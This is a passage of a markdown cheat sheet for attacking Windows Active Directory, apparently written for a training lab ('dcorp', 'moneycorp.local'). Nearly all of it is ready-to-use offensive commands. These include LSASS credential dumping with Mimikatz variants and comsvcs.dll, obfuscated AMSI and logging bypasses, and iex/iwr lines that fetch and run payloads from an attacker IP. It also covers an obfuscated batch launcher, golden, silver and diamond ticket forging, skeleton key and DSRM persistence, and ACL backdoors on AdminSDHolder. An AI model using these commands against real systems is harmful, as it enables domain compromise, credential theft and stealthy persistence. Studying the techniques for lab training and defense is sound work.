Invoke-Command -ScriptBlock ${function:<loaded_function>} -ComputerName (Get-Content <list_of_servers) -ArgumentList
```

Execute stateful commands using Invoke-Command:
```
$sess = New-PSSession -ComputerName <Servername>
Invoke-Command -Session $sess -ScriptBlock {$proc = <ps1 function>}
Invoke-Command -Session $sess -ScriptBlock {$proc.Name}
```

### Lateral movement using Winrs
Winrs can be used in place of PSRemoting to evade the logging:
```
winrs -r:<server_name> -u:<domain\user> -p:<password> cmd
```

### Lateral movement using Mimikatz
Mimikatz can be used to run credentials, tickets and many more interesting attacks. 

Invoke-Mimikatz is a PowerShell port of Mimikatz. Using the code from ReflectivePEInjection, mimikatz is loaded reflectively into the memory. All the functions of mimikatz can be used from this script.
**The script needs adminstrative privileges for dumping credentials from local machine** 

#### Extract credentials from LSASS
Dump credentials on a local machine using Mimikatz
```
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```

Dump credentials using SafetyKatz.exe
```
SafetyKatz.exe "sekurlsa::ekeys"
```

Dump credentials using SharpKatz
```
SharpKatz.exe --Command ekeys
```

Dump credentials using Dumpert
```
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
```

Dump credentials using pypykatz
```
pypykatz.exe live lsa
```

Dump credentials using comsvcs.dll
```
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full
```

#### Over Pass The Hash
Over Pass the Hash (OPTH) generate tokens from hashes or keys. 

**NOTE**: It need to be run as Administrator

Using Invoke-Mimikatz:
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:<domain_name> /aes256:<aes256key> /run:powershell.exe"'
```

Using SafetyKatz:
```
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:<domain_name> /aes256:<aes256keys> /run:cmd.exe" "exit"
```

Using Rubeus

The command below do not need elevation
```
Rubeus.exe asktgt /user:administrator /rc4:ntlmhash /ptt
```

The following command needs elevation
```
Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createonly:C:\Windows\System32\cmd.exe /show /ptt
```

#### DCSync
To exetract credentials from the DC without code execution on it, we can use DCSync. 

In order to use DCSync feature for getting krbtgt hash execute the below command **with Domain Admin privileges**
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
```

Using SafetyKatz
```
SafetyKatz.exe "lsadump::dcsync /user:<domain>\krbtgt" "exit"
```

### Derivative Local Admin to dump credentials
Using winrs to connect on remote machine on which the user has local admin privileges

```
winrs -r:<machine_name> cmd
```

Check whether AMSI and ScriptBlocking is enabled, this command provides constrains also for scripts
```
reg query HKLM\Software\Policies\Microsoft\Windows\SRVP2
```

CLM can block the script execution in specific locations, check where scripts can be executed
```
Get-ApplockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Disable ScriptBlocking
```
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der')).
	"gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+
	'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
```

Copy Mimikatz in 'Program Files' folder on the remote machine using powershell
```
Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\<remote_machine.domain>\c$\'Program Files'
```

Load Mimikatz
```
. .\Invoke-MimiEx.ps1 
```

### Exploiting a Domain Admin session
Bypass the ScriptBlocking
```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;   (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

The command can also be run using a reverse-shell
```
iex (iwr http://<my_ip>/sbloggingbypass.txt -UseBasicParsing)
```

Download PowerView.ps1
```
iex ((New-Object Net.Webclient).DownloadString('http://<my_ip>/PowerView.ps1'))
```

Enumerate Domain Admin Sessions
```
Find-DomainUserLocation
```

Download the file Loader.exe which will be useful to load malicious payloads
```
iwr http://<my_ip>/Loader.exe -OutFile C:\Users\Public\Loader.exe
```

Copy the file Loader.exe to a remote machine
```
echo F | xcopy C:\Users\Public\Loader.exe \\<machine_name>\C$\Users\Public\Loader.exe
```

Create a portproxy forwarding using netsh
```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<my_ip>"
```

On the machine with the session opened as Domain Admin run the following Safety.bat file 
```
@echo off
set "z=s"
set "y=y"
set "x=e"
set "w=k"
set "v=e"
set "u=:"
set "t=:"
set "s=a"
set "r=s"
set "q=l"
set "p=r"
set "o=u"
set "n=k"
set "m=e"
set "l=s"
set "Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%"
echo %Pwn%
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -Args %Pwn% exit
```

**Note:** in this case the %Pwn% variable is the string "sekurlsa::ekeys" to dump the session secrets

Performing the command 
```
$null | winrs -r:dcorp-mgmt "cmd C:\Users\Public\Safety.bat"
```
<div style="page-break-after: always;"></div>

## Kerberos

### Introduction
Kerberos is the basis of authentication in a Windows Active Directory environment. Clients (programs on behalf of a user) need to obtain tickets from Key Distribution Center (KDC) which is a service running on the domain controller. These tickets represent the client's credentials. Therefore Kerberos is a very interesting target to abuse.

### Kerberos Delegation
Kerberos Delegation allows to "reuse the end-user credentials to access resources hosted on a different server". Typically this is useful in multi-tier service or applications where Kerberos Double Hop is required. For example, users authenticates to a web server and makes requests to a database server. The web server can request access to the resources on the database server as the user and not as the web server's service account. For the previous example the service account of the web server must be trusted for delegation to be able to make requests as a user.

There are two types of Kerberos Delegation:
- **General/Basic or Unconstrained Delegation**: which allows the first hop server to request access to any service on any computer in the domain
- **Constrained Delegation**: which allows the first hop server to request access only to specified services on specified computers. If the user is not using Kerberos authentication to authenticate to the first hop server, Windows offers Protocol Transition to transition the request to Kerberos

In both types of delegation, a mechanism is required to impersonate the incoming user and authenticate to the second hop server as the user.

## Persisitence
### Persistence using Golden Tickets

A golden ticket is signed and encrypted by the hash of **krbtgt** account which makes it a valid TGT ticket. The **krbtgt** hash could be used to impersonate any user with any privileges from even a non-domain machine. As a good practice it is recommended to change the password of **krbtgt** account twice as password history is mantained for the account.

**Requirements**
- Krbtgt hash

In order to get the krbtgt hash there are several ways:
1. Execute Mimikatz or a variant on Domain Controller having Domain Admin privileges
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
```
2. Use the DCSync feature for getting AES keys of krbtgt account. Use the command below with Domain Admin privileges, this command does not need code execution on Domain Controller
```
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```
3. Dump the NTDS.dit file

**Get a Golden Ticket**

To get a golden ticket run the following command on a machine that has network connectivity with the domain controller:
```
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /aes256:<aes256_of_krbtgt> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

**Summary**
|  Options | Description  |
|---|---|
|  kerberos::golden | Name of the module  | 
| /user:  | username for which the TGT is required  |
|  /domain | domain FQDN  |
| /sid | domain sid |
| /aes256 | krbtgt aes256 |
| /id /groups | Optional user RID (default 500) and Group default 513, 512, 520, 518, 519 |
| /ptt or /ticket | /ptt injects the ticket in current process, /ticket saves the ticket for later use |
| /startoffset | Optional when the ticket is available in minutes |
| /endin | Optional Ticket lifetime in minutes (default 10 years) default DC setting is 600 |
| /renewmax | Optional ticket lifetime with renewal (default 10 years) default DC setting is 100800 |

**Using Rubeus**

We can also use Rubeus to forge a Golden Ticket with attributes similar to a normal TGT using the following command
```
C:\AD\Tools\Rubeus.exe golden /aes256:<aes256_of_krbtgt> /sid:<domain_sid> /ldap /user:<username> /printcmd
```

To be more silent enumerate an provide also the following data:
- Flags for user specified in /user
- Retrieve /groups, /pgid, /minpassage and /maxpassage
- /netbios of the current domain

|  Options | Description  |
|---|---|
|  golden | Name of the module  | 
| /user:  | username for which the TGT is required  |
| /aes256 | krbtgt aes256 |
| /sid | domain sid |
| /id /groups | Optional user RID (default 500) and Group default 513, 512, 520, 518, 519 |
| /domain | Domain FQDN |
| /ptt or /ticket | /ptt injects the ticket in current process, /ticket saves the ticket for later use |
| /pwdlastset | PasswordLastSet for the user |
| /minpassage | Minimum password age in days |
| /logoncount | Logon count for the user |
| /netbios:dcorp | NetBIOS name of the domain |
| /dc | FQDN of the domain controller |
| /uac | UserAccessControl Flags |

## Persistence using silver tickets

Silver ticket can be abused to access services on specific machines.

**Accessible Services**
- CIFS: File System
- HTTP: commands
- RPCSS: WMI
- HOST: WMI

For example using the command below we can access the File System on a machine.

```
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:<username> /domain:<domain_name> /sid:<domain_sid> /target:<machine_name\domain> /service:CIFS /rc4:<hash_of_machine> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

|  Options | Description  |
|---|---|
|  kerberos::golden | Name of the module  | 
| /user:  | username for which the TGT is required  |
| /aes256 | krbtgt aes256 |
| /sid | domain sid |
| /id /groups | Optional user RID (default 500) and Group default 513, 512, 520, 518, 519 |
| /domain | Domain FQDN |
| /ptt or /ticket | /ptt injects the ticket in current process, /ticket saves the ticket for later use |
| /target | Target FQDN |
| /startoffset | Optional when ticket becomes valid |
| /endin | Optional ticket lifetime |
| /renewmax | Optional Ticket lifetime with renewal | 

**Using Rubeus**

To forge a silver ticket using Rubeus we can use the following command

```
C:\AD\Tools\Rubeus.exe silver /service:<service>/<target.domain> /rc4:<hash_of_target> /sid:<domain_sid> /ldap /user:<username> /domain:<domain_name>
```

## Persistence using Diamond Tickets

A diamond ticket is created by decrypting a valid TGT, macking changes to it and re-encrypting it using the AES ticket of the krbtgt account. Therefore this is a ticket modification attack and not forging.

Diamond tickets are more opsec than golden and silver.

To create a diamond ticket use the following Rubeus command:

```
Rubeus.exe diamond /krbkey:<krbtgt_aes_key> /user:<username> /password:<password> /enctype:aes /ticketuser:administrator /domain:<domain_name> /dc:<Domain_controller_name.domain> /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

## Persistence using Skeleton Key

Skeleton key is a persistence technique where it is possible to patch Domain Controller (lsass process) so that it allows access any user with a single password. 

In order to perform this technique we need mimikatz. Use the command below to inject a skeleton key on a domain controller of choice. 

**NOTE**: Domain Administrator privileges required
```
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -Computername <domain_controller.domain>
```

Now it is possible to access any machine with a valid username and password as "mimikatz"
```
Enter-PSSession -Computername <server_name> -credential <domain\username>
```

Skeleton keys are not opsec and can cause issues with Active Directory CS.

## Persistence using DSRM
DSRM is Directory Services Restore Mode, there is a local administrator on every DC called "Administrator" whose password is the DSRM password. DSRM password is required when a server is promoted to Domain Controller and it is rarely changed.
After altering the configuration on the DC, it is possible to pass the NTLM hash of ths user to the DC.

To dump the DSRM password run the following command with Domain Admin privileges:
```
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername <domain_controller>
```

Compare the Administrator hash with the Administrator hash of below command
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' Computername <domain_controller>
```

Since it is the local administrator of the DC, we can pass the hash to authenticate, but the logon behavior of the DSRM account needs to be changed before we can use its hash
```
Enter-PSSession -Computername <domain_controller> New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

Then use the below command to pass the hash
```
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<domain_controller_name> /user:Administrator /ntlm:<Admin_hash> /run:powershell.exe"'
```
## Persistence using ACLs AdminSDHolder
AdminSDHolder resides in the system container of a domain and used to control the permissions for certain built-in privileged groups. Security Descriptor Propagator (SDPROP) runs every hour and compares the ACLs of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL.

Protected Groups:
- Account Operators
- Backup Operators
- Server Operators
- Print Operators
- Domain Admins
- Replicator
- Enterprise Admins
- Domain Controllers
- Read-Only Domain Controllers
- Schema Admins
- Administrators

Well known abuse of some of the Protected Groups - All the groups below can log on locally to DC
| Group | Abuse |
|-------|-------|
| Account Operators | Cannot modify DA/EA/BA groups. Can modify nested group within these groups |
| Backup Operators | Backup GPO, edit to add SID of controlled account to privileged group and restore | 
| Server Operators | Run a command as system |
| Print Operators | Copy ntds.dit backup, load device drivers |

With DA privileges we have full control on AdminSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with full permission to the AdminSDHolder object. In 60 minutes the user will be added with full control to the AC of groups like Domain Admins without actually being member of it.

With the following command we can add FullControl permissions for a user to the AdminSDHolder using PowerView as DA:
```
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=<domain>,dc=<domain>,dc=<domain>' -PrincipalIdentity <username> -Rights All -PrincipalDomain <domain> -TargetDomain <domain> -Verbose
```

Add the permission to ResetPassword
```
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=<domain>,dc=<domain>,dc=<domain>' -PrincipalIdentity <username> -Rights ResetPassword -PrincipalDomain <domain> -TargetDomain <domain> -Verbose
```

Add the permission to WriteMembers
```
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=<domain>,dc=<domain>,dc=<domain>' -PrincipalIdentity <username> -Rights WriteMember -PrincipalDomain <domain> -TargetDomain <domain> -Verbose
```

We can also run SDProp manually using Invoke-SDPropagator.ps1 from Tools directory:
```
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
```

We can also check the Domain Admins permissions:
```
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Covert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match <username>}
```

Abusing FullControl using PowerView
```
Add-DomainGroupMember -Identity 'Domain Admins' -Members <username> -Verbose
```

Abusing ResetPassword using PowerView
```
Set-DomainUserPassword -Identity <username> -AccountPassword (ConvertTo-SecureString "Password123@" -AsPlainText -Force) -Verbose
```

## Persistence using ACLs Rights Abuse
There are interesting ACLs which can be abused. For example, with DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl or the ability to run "DCSync"

Add FullControl rights:
```
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local0 -PrincipalIdentity <username> -Rights All -PricipalDomain <domain> -TargetDomain <domain> -Verbose
```

Add rights for DCSync
```
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity <username> -Rights DCSync -PrincipalDomain <domain> -TargetDomain <domain> -Verbose
```

Then execute DCSync
```
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

## Persistence using ACLs Security Descriptors
It is possible to modify security descriptors of multiple remote access methods to allow access to non-domain users. In order to perform this techniques administrative privileges are required.

Security Descriptor Definition Language (SSDL) defines the format which is used to describe a security descriptor. SSDL uses ACE strings for DACL and SACL:

ace_type; ace_flags; rights; object_guid; inherit_object_guid; account_sid (without spaces here reported for readability)

For example the ACE for built-in administrators for WMI namespaces is: A;CI;CCDLLCSWRPWPRCWD;;;SID

ACLs can be modified to allow non-admin users access to securable objects. Using the RACE toolkit:

Load RACE to powershell:
```
. C:\AD\Tools\RACE-master\RACE.ps1
```

Set WMI permission for a user on local machine:
```
Set-RemoteWMI -SamAccountName <username> -Verbose
```

Set WMI permission for a user on remote machine without explicit credentials
```
Set-RemoteWMI -SamAccountName <username> -ComputerName <machine_name> -namespace 'root\cimv2' -Verbose
```

Set WMI permission for a user on remote machine with explicit credentials
```
Set-RemoteWMI -SamAccountName <username> -ComputerName <machine_name> -Credential Administrator -namespace 'root\cimv2' -Verbose
```

Remove WMI permission from remote machine
```
Set-RemoteWMI -SamAccountName <username> -ComputerName <machine_name> -namespace 'root\cimv2' -Remove -Verbose
```








